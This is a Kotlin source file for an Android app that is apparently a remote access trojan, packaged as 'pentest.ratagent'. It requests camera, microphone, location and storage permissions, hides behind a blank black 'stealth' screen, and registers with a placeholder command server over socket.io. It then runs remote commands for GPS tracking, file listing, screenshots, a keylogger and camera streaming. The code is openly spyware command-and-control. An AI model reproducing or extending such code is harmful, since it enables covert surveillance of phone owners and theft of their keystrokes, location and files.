package com.pentest.ratagent

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.core.content.ContextCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

class MainActivity : ComponentActivity() {
    
    private lateinit var socket: Socket
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        SocketManager.init("http://YOUR_SERVER_IP:3001") // Replace with your server IP
        RatService.start(this)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestPermissions()
        setContent {
            MaterialTheme {
                Surface(color = Color.Black) {
                    StealthScreen()
                }
            }
        }
    }
    
    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        
        permissionLauncher.launch(permissions)
    }
}

@Composable
fun StealthScreen() {
    Box(modifier = Modifier
        .fillMaxSize()
        .background(Color.Black))
}

object SocketManager {
    var socket: Socket? = null
    
    fun init(url: String): Socket {
        socket = IO.socket(url).apply {
            on("connect") {
                emit("register-agent", JSONObject().apply {
                    put("agentId", "agent_${System.currentTimeMillis()}")
                    put("deviceInfo", getDeviceInfo())
                })
            }
            on("command") { args ->
                val command = args[0] as String
                handleCommand(command)
            }
            connect()
        }
        return socket!!
    }
    
    private fun getDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("model", android.os.Build.MODEL)
            put("brand", android.os.Build.BRAND)
            put("android", android.os.Build.VERSION.RELEASE)
        }
    }
    
    private fun handleCommand(command: String) {
        when {
            command.contains("get_gps") -> GpsTracker.getLocation()
            command.contains("list_files") -> FileManager.listFiles(command)
            command.contains("screenshot") -> Screenshot.capture()
            "start_keylogger" in command -> KeyLogger.start()
            "toggle_camera" in command -> CameraStream.toggle()
        }
    }
}